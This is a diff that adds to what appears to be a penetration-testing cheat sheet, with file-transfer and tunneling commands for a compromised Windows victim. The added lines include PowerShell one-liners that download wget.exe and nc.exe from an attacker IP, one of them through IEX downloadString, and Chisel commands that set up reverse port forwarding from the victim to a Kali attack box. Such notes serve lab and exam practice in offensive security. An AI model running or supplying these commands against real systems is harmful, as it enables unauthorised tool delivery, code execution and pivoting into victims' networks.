@@ -140,3 +140,26 @@ certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
 
 PowerShell:
 
+```
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
+```
+
+```
+powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.11.0.4/nc.exe')"
+```
+
+## Port forwarding and tunneling
+
+Using Chisel:
+
+Example using port forwarding so port 910 is available on kali box
+```
+on victim machine setup port forwarding
+chisel.exe client 10.10.16.10:5555 R:910:127.0.0.1:910
+```
+
+```
+On Kali attack box setup a reverse listner for port forward with chisel
+./chisel server --port 5555 --reverse
+```
+
